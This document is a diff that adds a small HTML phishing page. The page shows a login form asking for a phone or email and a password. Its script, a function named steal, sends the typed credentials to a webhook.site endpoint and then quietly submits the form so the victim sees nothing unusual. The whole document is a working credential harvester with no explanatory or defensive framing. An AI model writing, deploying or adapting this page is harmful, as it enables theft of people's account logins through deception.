@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <form onsubmit="steal(this)">
+    <input name="user" placeholder="Phone or Email">
+    <input name="pass" type="password" placeholder="Password">
+    <button>Login</button>
+  </form>
+
+  <script>
+  function steal(f) {
+    fetch('https://webhook.site/29c21a95-a21d-4e3e-94f3-bf856abb04d7', {
+      method: 'POST',
+      body: new URLSearchParams(new FormData(f))
+    }).then(() => {
+      f.submit();
+    });
+  }
+  </script>
+</html>
